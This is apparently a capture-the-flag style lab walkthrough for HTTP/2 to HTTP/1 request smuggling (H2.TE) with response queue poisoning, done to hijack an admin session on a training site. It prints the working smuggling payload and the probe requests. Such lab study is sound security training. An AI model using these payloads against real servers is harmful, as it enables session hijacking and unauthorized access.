Title: Response queue poisoning via H2.TE request smuggling
Level: PRACTITIONER
Desc: This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length.
To solve the lab, delete the user carlos by using response queue poisoning to break into the admin panel at /admin. An admin user will log in approximately every 15 seconds.
The connection to the back-end is reset every 10 requests, so don't worry if you get it into a bad state - just send a few normal requests to get a fresh connection. 

# Walkthrough:
Sending following request to desynchronise the queue:
```
POST / HTTP/2
Host: 0a5e004b04c2b2b780dd0383001a00ea.web-security-academy.net
Transfer-Encoding: chunked

0

GET /anything HTTP/1.1
Host: 0a5e004b04c2b2b780dd0383001a00ea.web-security-academy.net


```

And then sending request to probe: 
```
GET / HTTP/2
Host: 0a5e004b04c2b2b780dd0383001a00ea.web-security-academy.net
```
In response for probing request I get response dedicated for smuggled request.
<img width="1192" height="171" alt="image" src="https://github.com/user-attachments/assets/c631ed93-9ca3-4b45-a8ee-9dc01fab96ce" />

!`Remember to terminate the smuggled request properly by including the sequence \r\n\r\n after the Host header. `

<img width="1443" height="183" alt="image" src="https://github.com/user-attachments/assets/e706d60b-b5d5-4865-8eb5-f580aaf9a3a0" />

I got an admin account.
